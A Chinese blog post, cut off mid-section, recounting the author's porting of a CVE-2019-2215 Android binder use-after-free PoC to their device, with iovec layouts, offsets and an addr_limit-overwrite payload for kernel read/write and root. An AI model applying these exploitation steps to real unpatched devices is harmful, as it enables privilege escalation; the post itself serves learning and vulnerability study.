---
title: 小白移植 CVE-2019-2215 PoC 的过程
date: 2020-02-16 13:17:28
tags: [Android]
---

最近跟 @LI欣欣zn 大佬讨论了 CVE-2019-2215 这个漏洞，想拿它实现 Android root. 它是个 use-after-free 类型的洞，我一开始不太懂这种洞怎么利用（“难道不是未定义行为吗？”），又请教了 @mingjun97 大佬以后才稍微了解了点。这种漏洞，至少是本次漏洞，重点在于在 free 后到 use 前那段时间里，我们可以尝试把被 free 的内存据为己用（称为“占位”），这样就可以在这段内存写入特殊的内容，到了 use 时就会产生特殊效果。我太菜了.jpg

好在有不少用这个漏洞实现 root 的 PoC 代码，适合我这种一窍不通的小白直接编译了丢进去用。我和欣欣大佬都确认过设备开源出来的内核代码里没有打修复补丁，希望很大。大佬建议了一个写得比较优雅的[例子](https://github.com/kangtastic/cve-2019-2215/)。满怀希望地放进设备，一执行，设备重启了……

<!-- more -->

（注意，本文并不是讲这个漏洞的来龙去脉，而是我自己移植到我的设备上的经历而已，所以不会有 PoC 的完整解析，只会提及最重要的一些思路。如需严谨的分析，可另行查找）

大佬说能重启至少证明是有洞存在的，不然一个非特权用户进程不可能导致系统重启。漏洞确实有，但是这台设备 `adb bugreport` 无法导出内核日志，也看不到 console-ramoops，很难调试。只能自己盲猜想办法把 PoC port 到我们这台设备上了。希望它不要变成 DoS 漏洞 [doge]

## PoC 原理分析

### 漏洞能做啥？

要移植的话，得先了解清楚漏洞和 PoC 思路。大佬给了 [两篇](https://geneblue.github.io/2019/10/23/cve-2019-2215-binder/) [文档](https://hernan.de/blog/2019/10/15/tailoring-cve-2019-2215-to-achieve-root/) 参考。

漏洞本身的效果很简单：一个进程 epoll /dev/binder 的 fd 时，binder 驱动会创建一个 `struct binder_thread`，然后其中的 `wait` 成员被挂进 epoll 链表。而在 ioctl `BINDER_THREAD_EXIT` 时，这个 `struct binder_thread` 会被 free 掉，但是没有从内核的 epoll 链表上移除它。这个漏洞让 epoll 链表里出现了指向一个已被 free 的内存块的指针。

PoC 再接再厉：在上面这种情况下，我们再手动从 epoll 中移除这个 binder fd，epoll 就会 `list_del()` wait 成员里面的 `struct list_head`，这个操作是向这个 list_head 的内存空间写入（“泄露”）两个指向它自己的指针。**如果**上面这个 `binder_thread` 已经在 free 后为我们所有，我们就能整点好活了。

### 这个“如果”要怎么实现呢？

（好在从公司里学到了这个）

`binder_thread` 是 `kzalloc()` 分出来的，它是 400 字节左右，这种小尺寸会走 SLAB 从 kmalloc-512 这个池子里分一块。在它 free 以后，我们可以立即再去请求一块差不多大的内存，SLAB 有**很大概率**会把刚放进池子里的这块尚存一丝温热的内存再捞出来给我们，我们就能占到已故 binder_thread 的位了。很高效，也很符合本次需求 :-)

这个内存请求当然不是在用户态折腾，需要在内核里 kmalloc. 怎样能让内核 kmalloc 指定大小呢？这个洞的所有 PoC 都是以 `writev()` 等 iovec 相关函数实现的，因为 iovec 从用户态传入内核时基本都要经历 `import_iovec()` 把用户空间的 iovec 数组拷进内核，而这个函数里面有 kmalloc，iovec 数组长度又能方便地从用户态指定，还是 16 字节这样的细粒度， 同时 iovec 能用来做内存读写，简直不要太符合要求。

**如果** `writev()` 确实占到了 binder_thread 以前用的那块内存，上一节那个“如果”就能满足了，两个指向自己的指针会出现在我们的 iovec 数组（在内核里的拷贝）中。

> 好在这个“如果”不需要我们额外做什么就能以“很大概率”实现。

### 得到指向自己的指针，然后呢？

占位成功后，在进行 `list_del()` 时就肯定会有一个指向自己的指针被写到某个 iovec 的 iov_base 上。再**想办法**把这个 iovec 读出来就可以读到这个内存块从原来的 list_head 位置开始的数据了，也就是原来那个 binder_thread 的后半截。

> 什么办法可以把这个 iovec 再读出来呢？要说什么东西可以一边写一边读、能用 write(v)、还能在 writev 中间停下来给机会触发漏洞的话，可能第一个想到的就是 pipe 了（可惜我想不到）。PoC 里面第一次读取就是用的 pipe.
>
> 写端用 writev 写，另一边用个简单的 read 就行了，反正读的时候也没有什么洞要钻，越简单越好。
>
> > 然而 PoC 第二次读取就换成 `socketpair()` 秀了我一脸。我之前真的不知道还有 socket pair 这种东西 [doge]

偏巧 `binder_thread` 最后一个成员是指向当前进程的 `struct task_struct *`，如果能操作 task_struct 的话一切都会变得有意思起来。所以，在上面读取后半截的时候，要确认把这个指针读出来。

### 得到自己的 task_struct *，然后呢？

这个结构体里面有 uid、gid、SELinux context 之类的信息。看到这些玩意眼睛都亮了 23333 但是光看不行，还得改了才有用。

要怎么才能按照这个指针写入数据呢？iovec 在上面被拿来做读取用了，现在得考虑下它在写入方面的用途，比如 readv. 但是要记住这个大前提：漏洞会把某个 iovec 的 iov_base 改成指向自己的地址。只靠漏洞来读写的话，读只能从自己开始，写也只能从自己开始。乍一看好像不能向任意地址写入，但仔细想想既然能我 写 我 自 己 的话，可以把某个 iovec 的地址在被漏洞覆盖后再次覆盖成我们的目标地址，这样 iovec 就可以指向任意地址了！

> 这个设计是如此精巧，我看到这里的时候真的是惊呆了！

> 为什么不直接把 `struct task_struct *` 作为初始 iovec 数组里某个 iov_base 传进去？因为内核会检查当前程序能使用的地址范围有多大，直接传个内核的地址进去肯定通不过检查，所以必须得用一个假地址通过检查，待开始读写操作后再覆盖成需要的地址。下一节会描述。

二次覆盖以后，只要接着写下去，就可以很轻松地通过被我们覆盖的 iov_base 来写入 `task_struct *` 里面我们需要的那几个字段了。

这里甚至还可以扩展一下：如果想读任意地址，那么可以先按照上一节的流程来读，触发漏洞拿到读取所用 iovec 地址后再来一次本节的任意写，再触发一次漏洞并修改读时的 iovec，这样就可以读任意地址了。

到此为止，已经可以在内核空间任意读写，剩下的问题都可以留到 debug 阶段再说了。

> 然而这样实现的读写，每次操作都要触发漏洞，每次都要期待 SLAB 给出同一块内存，有一次失败就前功尽弃了（或者要多次重复直到成功，效率低下）。尽管每次都“概率很大”但乘起来还是会很低。

### 能不能稳定读写，别钻洞撞概率了？

这里已经跟漏洞没关系了，不过也很简单顺便提一下。

内核给每个进程都创建了一个 `struct thread_info`，里面有个 addr_limit 字段（ARM64 为例），决定当前进程能访问的地址空间上限在哪（比如 0x8000000000000000）。**如果**能把它改成全 F，我们就可以访问全部内存了。

> 注意，这里并不是允许在用户态直接解引用内核地址范围内的指针，而是 syscall 陷入内核态以后让内核做权限检查时能通得过去——我寻思不少架构上用户态和内核态能访问的内存范围至少在 TLB 就隔开了，那不是随便写 8 字节就能改的。
>
> 上一节里面“为什么不直接把 `struct task_struct *` 作为初始 iovec 数组里某个 iov_base 传进去？”所说的检查也正是这个检查。不过，addr_limit 解开以后直接用 read、write 之类简单的 syscall 配合 pipe 就可以读写任意内存了，用不着额外再去搞 iovec.
>

这个 thread_info 可能直接嵌在 task_struct 里面（第一个元素），也可能在进程的 stack 里面（`(struct task_struct *)current->stack` 指向的空间），受 `CONFIG_THREAD_INFO_IN_TASK` 控制。在 ARM64 上，它的第二个 uint64_t 就是 addr_limit，用户态程序正常情况是 0x8000000000000000，可以拿这个作为标志去判断是哪一种。如果 task_struct 的第二个 uint64_t 不是这个值，就得在 stack 空间里从前到后搜索了。

Android 这边没开 structure field randomization，查找位置是可行的，上面也给出了任意写入的方法，这个“如果能改成全 F”是可以做到的。

### 总结

上面的一层层依赖关系下来，可以发现一共要按顺序做这些事：

1. 开个 pipe，开始 writev
2. 在 writev 的过程中卡住（写一个 pipe size 的废数据，然后读端不读）
3. 触发漏洞（因为 writev 会阻塞，进去以后啥都干不成，所以得开个子线程等几秒再触发）
4. 子线程里读完废数据和有效数据，读到 binder_thread 结尾那个 task_struct * 停下
5. 开另一个 pipe，开始 readv（或者 socketpair / recvmsg）
6. 触发漏洞
7. write 新的 iov_base，覆盖掉自己
8. write 新数据（视情况可能需要先按前面说的方法读出原数据再修改）

## 移植过程

好了，原理就是这么多了，可以开始检查为什么原版 PoC 一运行就重启了。

### 1. writev 没返回就重启

到了 writev 没一会儿就崩了，writev 没有返回，子线程也还没开始读数据。可能是触发漏洞的时候 use 部分炸了。

对比一下 PoC 里面的结构体偏移量和我设备的内核源码，发现 PoC 里面 `binder_thread` 的 wait 成员在 0xA0 位置开始，而我的在 0x98 位置。这样就导致漏洞触发后 `import_iovec()` 往 `binder_thread` 写的数据被解析成不一样的含义。如下：

```
# 我的设备
binder_thread->wait.lock      在 0x98 对应 &iovec[9 ].iov_len
binder_thread->wait.head.next 在 0xA0 对应 &iovec[10].iov_base
binder_thread->wait.head.prev 在 0xA8 对应 &iovec[10].iov_len

# PoC
binder_thread->wait.lock      在 0xA0 对应 &iovec[10].iov_base
binder_thread->wait.head.next 在 0xA8 对应 &iovec[10].iov_len
binder_thread->wait.head.prev 在 0xB0 对应 &iovec[11].iov_base
```

按 PoC 的构造逻辑，改成我的偏移以后，构造的结构体为

```c
// iov_idx = offsetof(binder_thread->wait) / sizeof(iovec)
//         = 152 / 16
//         = 9
bio.iovs[9].iov_base  = dummy_page;
bio.iovs[9].iov_len   = PAGE_SIZE;
bio.iovs[10].iov_base = (void *)0xdeadbeef;
bio.iovs[10].iov_len  = PAGE_SIZE;
```

在触发漏洞时，会被解释为

```c
binder_thread->wait.loc       = PAGE_SIZE;
binder_thread->wait.head.next = &binder_thread->wait.head; /* 甚至可能还没来得及改 */
binder_thread->wait.head.prev = &binder_thread->wait.head;
```

注意此时 lock 的值是 PAGE_SIZE (0x1000)，这是一个非解锁的 spinlock 状态。ARM64 的 spinlock 结构如下：

```c
typedef struct {
#ifdef __AARCH64EB__
    u16 next;
    u16 owner;
#else
    u16 owner;
    u16 next;
#endif
} __aligned(4) arch_spinlock_t;
```

一共 32bit，高低 16bit 相等时认为处于解锁，不等时处于加锁。类似于餐厅取号等叫号再入座的逻辑。上面写入 PAGE_SIZE 后，在 `epoll_ctl(EPOLL_CTL_DEL)` 时对这个锁有操作就崩了（我也不知道为什么）。需要将 `bio.iovs[9].iov_len` 改成一个已解锁的 spinlock 内容，例如 `0x0`, `0x00010001`, `0x00020002` 之类。看着 0 比较简单，就先改 0 吧。

### 2. read 出来数据全为 0x00

#### Round 1

上面改完以后，我的 iovec 变成这样

```c
/* PoC */
bio.iovs[9].iov_base  = dummy_page;
bio.iovs[9].iov_len   = 0;
bio.iovs[10].iov_base = dummy_page; /* 非独享设备，我把这里也改成有效地址，避免总是重启影响别人用（虽然没卵用） */
bio.iovs[10].iov_len  = PAGE_SIZE;
```

在触发漏洞时，会被解释为

```c
binder_thread->wait.lock      = 0;
binder_thread->wait.head.next = &binder_thread->wait.head;
binder_thread->wait.head.prev = &binder_thread->wait.head;
```

这次 spinlock 过了，机器不会重启，但是结果 read 出来全是 0，没有我们要的 task_struct *

这里需要看看 pipe 写入的流程了：

```c
/* fs/pipe.c */
static ssize_t
pipe_write(struct kiocb *iocb, struct iov_iter *from)
{
	size_t total_len = iov_iter_count(from); // 刚进入函数就计算好了要复制的长度，此时还没有触发漏洞
	ssize_t chars;

    /* 条件检查 */

	/* We try to merge small writes */
	chars = total_len & (PAGE_SIZE-1); /* size of the last buffer */
	if (pipe->nrbufs && chars != 0) {
		int lastbuf = (pipe->curbuf + pipe->nrbufs - 1) &
							(pipe->buffers - 1);
		struct pipe_buffer *buf = pipe->bufs + lastbuf;
		int offset = buf->offset + buf->len;

		if (buf->ops->can_merge && offset + chars <= PAGE_SIZE) {
			/* 条件检查 */

			ret = copy_page_from_iter(buf->page, offset, chars, from);
			/* 错误检查、唤醒 */
			buf->len += ret;
			if (!iov_iter_count(from))
				goto out;
		}
	}

	for (;;) {
		int bufs;

		/* 条件检查 */
		bufs = pipe->nrbufs;
		if (bufs < pipe->buffers) {
			struct page *page = pipe->tmp_page;
			int copied;

			if (!page) {
				page = alloc_page(GFP_HIGHUSER | __GFP_ACCOUNT);
				/* 错误检查 */
				pipe->tmp_page = page;
			}

			copied = copy_page_from_iter(page, 0, PAGE_SIZE, from); // 真实复制
			/* 错误检查 */

			/* Insert it into the buffer array */
			/* 上述流程 */
            pipe->nrbufs = ++bufs;
			pipe->tmp_page = NULL;

			if (!iov_iter_count(from))
				break;
		}
		if (bufs < pipe->buffers)
			continue;
		/* 条件检查和唤醒 */
		pipe_wait(pipe);
	}
	/* 后续操作 */
}
```

可以看出：

1. 要复制的总字节数会在 **writev 刚被调用时就计算出来**

   > 也就是说，在 writev 卡住并触发漏洞以后，就算 iov_len 被覆盖了，要复制的字节数也不会更新！要读多少字节，在传入 iovec 时就要算好。另外，**这里只是一个总长，在传入 iovec 时可以把长度加在任意一个 iovec 上，即便被覆盖后并不是从这个 iov_base 上读了 iov_len 这么长。**

2. 不管是合并当前数据到最后一个待写 page 还是正常的复制流程，核心都是 `copy_page_from_iter()`

3. pipe 不管输入多少数据，一次都是复制一页内容

4. 复制完成后，只要 `iov_iter_count()` 为 0，复制就会停止。

这两个 iov_ 相关函数如下：

```c
/* include/linux/uio.h */
struct iov_iter {
	unsigned int type;
	size_t iov_offset;
	size_t count; /* 这个 iov_iter 所含的 iov 一共多少字节，初值在 iov_iter_init() 设定，此处略 */
	union {
		const struct iovec *iov;
		/* 还有其他类型的 iovec 指针 */
	};
	union {
		unsigned long nr_segs;
		struct {
			unsigned int head;
			unsigned int start_head;
		};
	};
};

static inline size_t iov_iter_count(const struct iov_iter *i)
{
	return i->count; /* 初值是在 iov_iter_init() 中设置的，就是把所有 iov_len 加起来，此处略 */
}

/* lib/iov_iter.c */
static size_t copy_page_from_iter_iovec(struct page *page, size_t offset, size_t bytes,
			 struct iov_iter *i)
{
	size_t skip, copy, left, wanted;
	const struct iovec *iov;
	char __user *buf;
	void *kaddr, *to;

	/* 条件检查 */

	wanted = bytes;
	iov = i->iov;
	skip = i->iov_offset;
	buf = iov->iov_base + skip;
	copy = min(bytes, iov->iov_len - skip);

	if (IS_ENABLED(CONFIG_HIGHMEM) && !fault_in_pages_readable(buf, copy)) {
		kaddr = kmap_atomic(page);
		to = kaddr + offset;

		/* first chunk, usually the only one */
		left = __copy_from_user_inatomic(to, buf, copy); // 第一次复制
		copy -= left;
		skip += copy;
		to += copy;
		bytes -= copy;

		while (unlikely(!left && bytes)) {
			iov++;
			buf = iov->iov_base;
			copy = min(bytes, iov->iov_len);
			left = __copy_from_user_inatomic(to, buf, copy); // 大于一页时多次复制
			copy -= left;
			skip = copy;
			to += copy;
			bytes -= copy;
		}
		if (likely(!bytes)) {
			kunmap_atomic(kaddr);
			goto done;
		}
		offset = to - kaddr;
		buf += copy;
		kunmap_atomic(kaddr);
		copy = min(bytes, iov->iov_len - skip);
	}
	/* Too bad - revert to non-atomic kmap */
	/* 上述特殊情况 */

done:
	if (skip == iov->iov_len) {
        // 若本次恰好复制完一个 iovec，则将指针跳到下一个 iov（而不是等下次复制再跳）
		iov++;
		skip = 0;
	}
	i->count -= wanted - bytes;
	i->nr_segs -= iov - i->iov;
	i->iov = iov;
	i->iov_offset = skip;
	return wanted - bytes;
}
```

可以得出结论：

1. iov_iter 的 count 是在 `import_iovec()` 时就决定好的，中间触发漏洞不会更改，只会随着复制慢慢减少

2. 如果单次 `copy_page_from_iter_iovec()` 时恰好复制完一个 iovec，则立即将跳到下个 iovec.

   但如果下个 iovec 的长度是 0，则不会继续跳，要等下次调用时才跳（对应上面说的“一次最多只复制到一个 iovec 的结尾”）

3. 单次复制要复制多少字节是在复制一开始时就算好的。如果复制中途 iov_len 变了，也不会影响。

上面一共 7 个结论，就可以分析传入之前的 iovec 的问题了。回顾一下那些 iovec：

```c
bio.iovs[9].iov_base  = dummy_page;
bio.iovs[9].iov_len   = 0;
bio.iovs[10].iov_base = dummy_page;
bio.iovs[10].iov_len  = PAGE_SIZE;
```

iov_iter 初值为：

```c
struct iov_iter {
	size_t iov_offset; // 0
	size_t count; // 0x1000
    const struct iovec *iov; // &bio.iovs[0]
};
```

writev 时，pipe 一次读一页，第一个 iovec 被直接跳过，从第二个 dummy_page 读了一页之后卡住。此时，iov_iter 为：

```c
struct iov_iter {
	size_t iov_offset; // 0x1000
	size_t count; // 0
    const struct iovec *iov; // &bio.iovs[10]
};
```

再触发漏洞，iovec 和 iov_iter 变成：

```c
bio.iovs[9].iov_base  = dummy_page;
bio.iovs[9].iov_len   = 0x10001; /* spin_unlock() 后变的 */
bio.iovs[10].iov_base = &binder_thread->wait.head;
bio.iovs[10].iov_len  = &binder_thread->wait.head;
```

但是，此时 iov_iter.count 已经是 0 了，所以不能再利用新地址读出数据，`writev()` 早就返回了。已经读出来的都是 dummy_page 里的东西，当然全 0.

要修改的话，只要第一个 iovec 没能卡住，那么一定会在复制刚开始时就读到第二个 iovec，那么再触发漏洞就太晚了没用了。所以，必须在第一个 iovec 卡住。

> 有一瞬间有个想法：如果利用 pipe 写满 pipe size 自动卡住的功能，保持第一个 iovec iov_len 为 0，在第二个 iovec 写了一个pipe 后卡住时触发漏洞，能否泄露成功呢？
>
> 当然是不能啦，因为此时 iov_iter.iov_offset 已经是 pipe size 了，此时触发漏洞覆盖地址后再读就是 `&binder_thread->wait + pipe_size` 的内容，我们要的数据被跳过了。

#### Round 2

当时当然是没有现在这么清晰的分析的，xjb 试了非常多构造方法，都无效（比如在 `bio.iovs[8]` 试了半天却没有改 iov_len，这显然没用的）。

```c
bio.iovs[9].iov_base  = dummy_page;
bio.iovs[9].iov_len   = 0x10001000;         // 修改了，保证卡住
bio.iovs[10].iov_base = (void *)0xdeadbeef; // 这个时候发现了就算是错的也不重启，就改回来了
bio.iovs[10].iov_len  = PAGE_SIZE;

// 以下为初始化状态
struct iov_iter {
	size_t iov_offset; // 0
	size_t count; // 0x10002000
    const struct iovec *iov; // &bio.iovs[0]
};
```
在复制完第一个 page 后卡住触发漏洞，最终表现是只复制了 0x10001000 个字节，后面那个 PAGE_SIZE 没有被复制。

> 人间蒸发的 PAGE_SIZE 个字节。

在刚触发完漏洞时，各结构体状态为：

```c
bio.iovs[9].iov_base  = dummy_page;
bio.iovs[9].iov_len   = 0x10011001;
bio.iovs[10].iov_base = &binder_thread->wait.head;
bio.iovs[10].iov_len  = &binder_thread->wait.head;

struct iov_iter {
	size_t iov_offset; // 0x1000
	size_t count; // 0x10001000
    const struct iovec *iov; // &bio.iovs[9]
};
```

注意 `bio.iovs[9].iov_len` 已经大于剩下要读的字节数（count - iov_offset = 0x10001000），所以以后所有字节都将从  `bio.iovs[9].iov_len` 读取。而 dummy_page 只映射了 0x10001000 这么多字节，导致只能复制出这么多字节，`bio.iovs[10]` 压根就没复制到。

> 这个好像有点走进科学，不过做 mmap 的时候真的只映射了这么多，当时没有研究得这么完全，没想到 iov_len 还在用的时候变了

#### Round 3

终于懂了要考虑 iov_len 在复制中的变化，这导致一开始给长度的时候要把一些额外的长度加在第二个 iovec 里面，抵消掉第一个 iovec 在复制中变长导致的影响。于是构造成这样：

```c
bio.iovs[9].iov_base  = dummy_page;
bio.iovs[9].iov_len   = 0x10001;
bio.iovs[10].iov_base = (void *)0xdeadbeef;  // 这个时候发现了就算是错的也不重启，就改回来了
bio.iovs[10].iov_len  = 0x10001 + PAGE_SIZE; // 这里加了 0x10001 就是为了抵消第一个 iovec 变长，实际读取的时候并不会从这里读 0x10001 字节

// 以下为初始化状态
struct iov_iter {
	size_t iov_offset; // 0
	size_t count; // 0x21002
    const struct iovec *iov; // &bio.iovs[0]
};
```

在复制完第一个 page 后卡住触发漏洞，在刚触发完漏洞时，各结构体状态为：

```c
bio.iovs[9].iov_base  = dummy_page;
bio.iovs[9].iov_len   = 0x20002;
bio.iovs[10].iov_base = &binder_thread->wait.head;
bio.iovs[10].iov_len  = &binder_thread->wait.head;

struct iov_iter {
	size_t iov_offset; // 0x1000
	size_t count; // 0x20002
    const struct iovec *iov; // &bio.iovs[9]
};
```

继续读取至 0x20000 字节处，此时状态为：

```c
struct iov_iter {
	size_t iov_offset; // 0x20000
	size_t count; // 0x1002
    const struct iovec *iov; // &bio.iovs[9]
};
```

再执行读取一个 page，前两个字节还在 `bio.iovs[9]` 中读取，然后进入 `copy_page_from_iter_iovec()` 的 `while(unlikely)` 循环，进入下个 iovec（终于！）：

```c
bio.iovs[9].iov_base  = dummy_page;
bio.iovs[9].iov_len   = 0x20002;                  // 读完了，已经跳过去了，没用了
bio.iovs[10].iov_base = &binder_thread->wait.head;
bio.iovs[10].iov_len  = &binder_thread->wait.head;

// 刚开始读第二个 iovec 时
struct iov_iter {
	size_t iov_offset; // 0
	size_t count; // 0x1000
    const struct iovec *iov; // &bio.iovs[10]
};
```

然后就会从 `&binder_thread->wait.head` 读 0x1000 字节了，其中第 0xe8 (`offsetof(binder_thread.task) - offsetof(binder_thread->wait.head) = 0xe8`) 字节开始应该就是 task_struct * 了。

……但是它还是全 0

> 我气死了

#### Round 4

万般无奈之际上谷歌搜我这种 wait 在 0x98 的有没有现成 PoC，真找到[一份](https://repo.or.cz/cve2019-2215-3.18.git/blob/refs/heads/master:/su98.c)（还是从失效的 GitHub 链接搜 repo 主的名称才找到这里来），实测可以取得 uid = 0、gid = 0 的效果。它里面这样写：

```c
// NOTE: we don't cover the task_struct* here; we want to leave it uninitialized
#define BINDER_THREAD_SZ 0x188
#define IOVEC_ARRAY_SZ (BINDER_THREAD_SZ / 16) //25

struct iovec iovec_array[IOVEC_ARRAY_SZ];
```

0x188 是 392，`IOVEC_ARRAY_SZ` 是 24 而不是 25（这个 `//25`，emmmmmmm）

> 这个 PoC 整个代码都写得非常狂野

特别注意顶上那句注释，专门提到了不覆盖到 `task_struct*`，而整个结构体 400 字节大，392 正好是去掉了 `task_struct *` 的体积。

看到这里我忽然明白了，如果 iovec 数组有 400 字节大，那么在一开始 `import_iovec()` 时就会把 400 字节完整复制过来，第 392 到第 400 字节的 `task_strcut *` 就被最后一个 iovec 覆盖掉了，当然 tmd 读出来是 0 了！

> 这是真的走进科学……

在我一开始一直研究的那份 PoC 里，关于数组大小的计算是这样的：

```c
/* The exploit relies upon a use-after-free by the kernel's epoll cleanup code
 * resulting from an oversight in Android's Binder IPC subsystem, fixed here:
 *
 *  https://git.kernel.org/pub/scm/linux/kernel/git/stable/linux.git/commit/drivers/android/binder.c?h=linux-4.14.y&id=7a3cee43e935b9d526ad07f20bf005ba7e74d05b
 *
 * In the original Project Zero POC, arrays of 25 `struct iovec`s are treated
 * as `struct binder_thread`s by the kernel. We do the same here via a union,
 * which hopefully clarifies where the #defines of 25 and 10 came from in the
 * original POC. Since we're using structure definitions for offsets only, we're
 * fine cutting off 8 bytes from our definition of a `struct binder_thread` to
 * ensure `sizeof(binder_iovecs) == sizeof(struct iovec[25]) == 400`.
 */
const size_t iovs_sz = sizeof(struct binder_thread) / sizeof(struct iovec);
const size_t iov_idx = offsetof(struct binder_thread, wait) / sizeof(struct iovec);
```

> Since we're using structure definitions for offsets only, we're fine cutting off 8 bytes from our definition of a `struct binder_thread` to ensure `sizeof(binder_iovecs) == sizeof(struct iovec[25]) == 400`.

这位作者的机器上 binder_thread 有 408 字节大，因为“计算方便”而 cut 掉的那 8 个 byte 正好就是 `task_struct *` 的位置，这真的叫一个“恰好完全”碰上正确的结果，恰好完全把这个指针留下未被覆盖……

> 欲哭无泪

所以把 `iovs_sz` 最后加个 ` - 1`，保持 Round 3 的代码不动，就可以读出指针了。

> 太难了

### 2.5 直接使用 Round 4 的参考 PoC？

这个 PoC 是靠 /proc/kallsyms 查找 `selinux_enforcing` 这个 symbol 来覆盖它的，但是我这个设备上无法覆盖 /proc/kallsyms 打印用的格式字符串，提示说可能因为常量区只读。所以打出来的地址全是 0，包括后面 avc_denied 也找不到，所以它关不掉 SELinux.

如果只有 uid = 0、gid = 0 而 SELinux enforcing 的话，连 `ls /data` 都会是 Permission denied. 我也不知道这个 root 用户有什么用……

如果使用最早一篇文档里的方法去找符号，把得出的地址套在这个 PoC 上，倒是可以用。不过这个 PoC 实在是太难看了，我也想再检验一下自己上面的分析到底好不好用，所以还是决定把原来那个 PoC 修好。

> “倒是可以用”
>
> “可以用”
>
> “用”

### 3. 适配任意写入逻辑

最开始 PoC 的第一步 `find_current()` 已经改完了，现在考虑第二步 `obtain_kernel_rw()`. 这一步写 addr_limit 改用了 `socketpair()` 而非 `pipe()`，但两者没有太大区别。核心的 iovec 操作逻辑一个是 `copy_page_from_iter_iovec()` 一个是 `copy_to_iter()`，其中 iov_iter 操作逻辑极为近似，所以分析思路一样。其他一些诸如双端均可读写、不会自带阻塞之类的差异都不影响分析。

socket pair 上，接收进 iovec 的函数是 `recvmsg()`，对应发送端用个简单的 `write()` 就行。

PoC 里面构造的接收用 iovec 如下：

```c
bio.iovs[9].iov_base  = dummy_page;         // 对应 PoC 的 binder_thread->wait.lock
bio.iovs[9].iov_len   = 1;                  // 对应 PoC 的 binder_thread->wait.head.next
bio.iovs[10].iov_base = (void *)0xdeadbeef; // 对应 PoC 的 binder_thread->wait.head.prev
bio.iovs[10].iov_len  = 0x8 + 2 * 0x10;
bio.iovs[11].iov_base = (void *)0xbeefdead;
bio.iovs[11].iov_len  = 8;

u64 second_write_chunk[] = {
    1,
    0xdeadbeef,
    0x8 + 2 * 0x10,
    current + 0x8, // current 就是前面藏在 binder_thread 尾巴上的 task_struct *
    8,
    0xfffffffffffffffe
};
```

socket pair 初始化好后立即 `write()` 一字节进去，然后开始 `recvmsg()`，再开始触发漏洞，最后写入 `second_write_chunk`. 这里发生了这么些事：

1. 立即 `write()` 一字节垃圾数据进去：第一个 iovec 用完，跳至下一个 iovec

   此时 iov_iter 为：

   ```c
   struct iov_iter {
   	size_t iov_offset;       // 0
   	size_t count;            // (1 + 0x8 + 2 * 0x10 + 8)  - (1) = 0x30
       const struct iovec *iov; // &bio.iovs[10]
   };
   ```

2. 触发漏洞：iovec 变为：

   ```c
   bio.iovs[9].iov_base  = dummy_page + 0x10001;      // 他（spinlock）改变了 iov_base
   bio.iovs[9].iov_len   = &binder_thread->wait.head; // 这个 iov 已经用完跳过去了，这两个怎么变都行
   bio.iovs[10].iov_base = &binder_thread->wait.head; // 我 写 我 自 己，指向 &bio.iovs[9].iov_len
   bio.iovs[10].iov_len  = 0x8 + 2 * 0x10;            // 从这开始都没变
   bio.iovs[11].iov_base = (void *)0xbeefdead;
   bio.iovs[11].iov_len  = 8;
   ```

   没有读写动作，iov_iter 没变。

3. 写入 `second_write_chunk`. 注意此时 iov 是 `bio.iovs[10]`，它的 base 已经变成 `&binder_thread->wait.head`，也就是 `&bio.iovs[9].iov_len`；它的 iov_len 是 0x28，小于 `second_write_chunk` 的 0x30，那么 `copy_to_iter()` 会分两次来写这个 chunk，一次写一个 iovec. 第一次 copy 写完这个 iovec 的结果是：

   ```c
   bio.iovs[9].iov_base  = dummy_page + 0x10001; // 没被写，反正跳过了无所谓
   bio.iovs[9].iov_len   = 1;                    // 被写了，反正跳过了无所谓
   bio.iovs[10].iov_base = 0xdeadbeef;           // 被写了，这个 0x28 能一次直接写完，本次写完就跳去下一个了不会再用这个字段，所以这里写啥都不会挂
   bio.iovs[10].iov_len  = 0x8 + 2 * 0x10;       // 被写了，写进了一样的内容，就当作没变过吧
   bio.iovs[11].iov_base = current + 0x8;        // 被写了，这是我们真正需要写入的地址
   bio.iovs[11].iov_len  = 8;                    // 被写了，写进了一样的内容，就当作没变过吧

   // second_write_chunk 是 0x30 大，在写完 0x28 的 bio.iovs[10] 后 iov_iter 变为
   struct iov_iter {
   	size_t iov_offset;       // 0
   	size_t count;            // (1 + 0x8 + 2 * 0x10 + 8)  - (1 + 0x28) = 8
       const struct iovec *iov; // &bio.iovs[11]
   };
   ```

4. 这样就通过自己写自己绕开了内核地址的权限检查，把 current + 0x8 写进了 `bio.iovs[11].iov_base`. 

   前一步写完 0x28 长的 `bio.iovs[11]` 以后 iov 指针跳到 `bio.iovs[11]` 上，继续写 `second_write_chunk` 最后剩下的 8 字节 `0xfffffffffffffffe`，也就是写入 `bio.iovs[11].iov_base` 所指的 `current + 8`. 这样就修改了 addr_limit.

5. 万事俱备，只等后续提权逻辑。

> 其实我觉得可以不写 `bio.iovs[11].iov_len`，反正没人能影响到它，初始是 8 就一直是 8.

思路稍微有一点点绕，主要是“我写我自己”这块放在脑子里算的话有点不太清楚，写下来就好了。

对于我们这种 0x98 的设备来说，如果构造一样的 iovec（除了 spinlock 的那个 iov_len 写成 0x10001，最开始发垃圾数据要发 0x10001 字节），触发漏洞后会变成：

```c
bio.iovs[9].iov_base  = dummy_page;                // 没动
bio.iovs[9].iov_len   = 0x20002;                   // 他（spinlock）改变了 iov_len，不过反正跳过去了
bio.iovs[10].iov_base = &binder_thread->wait.head; // 我 写 我 自 己，一字节不差指向自己
bio.iovs[10].iov_len  = &binder_thread->wait.head; // 这么大的 len
bio.iovs[11].iov_base = (void *)0xbeefdead;        // 从这开始都没变
bio.iovs[11].iov_len  = 8;
```

> 看到没有？这是真的我 写 我 自 己，原地 TP！

这样一来，我们就会面临一个挑战：当垃圾数据写完、触发漏洞以后，下个 iovec 复制开始时，`bio.iovs[10]` 的 iov_len 是错误的非常大的数值，不更正的话不可能写满它，也就不可能进入下个写真正数据的 iovec！

> 确切地说，只要当抵达 `bio.iovs[10]` 能够开始写自己的时候，iov_len 就一定是错误的。因为在“写自己”之前无法更正 iov_len，而要能写自己，则又一定触发了漏洞导致 iov_len 错误。

> 还记得 Round 1 里分析 `copy_page_from_iter_iovec()` 的时候提到过“单次复制要复制多少字节是在复制一开始时就算好的。如果复制中途 iov_len 变了，也不会影响”吗？
>
> 你看，现在长度错了，而一旦开始复制这个 iovec，就算靠这次复制更正了 iov_len，也不会影响最开始那个错误的预期复制长度，不可能在这次复制中跳到下个 iovec 了。是不是很糟糕？

不过，如果 `write()` 一字节就停下来，再开始新一次 `write()`，就会重新进入 `copy_to_iter()`，这样就能重新计算长度了。

> 办法总比困难多。想通以后令人极度舒适。

那么，需要构造的数据如下：

```c
